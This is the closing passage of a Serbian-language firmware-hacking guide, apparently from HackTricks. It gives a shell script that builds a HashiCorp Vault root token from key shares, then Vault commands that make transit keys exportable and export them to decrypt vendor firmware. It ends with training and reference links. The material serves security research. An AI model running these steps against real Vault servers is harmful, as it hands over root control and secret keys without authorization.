OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ sa tačnim parom padding/hash koji koristi KMS. Neuspešan PKCS#1 v1.5 decrypt i neuspešan podrazumevani OAEP decrypt **ne dokazuju** da je ključ pogrešan; mnogi Vault-backed tokovi koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na legacy appliance uređajima) pre pokušaja AES-CBC decryption-a.

Ovo pretvara problem „encrypted firmware“ u opštiji problem: **oporavite operativne ključeve sa strane appliance-a, a zatim offline reprodukujte tačne parametre za unwrap + KDF**.

## Obuke i sertifikacije

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware sa Claude-om: veština na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT Hacking: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada ga vidiš: sada si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector uređaja preko konektora za punjenje - 2. deo: zaobilaženje zaštite od downgrade-a](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation Philips Hue Bridge-a](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
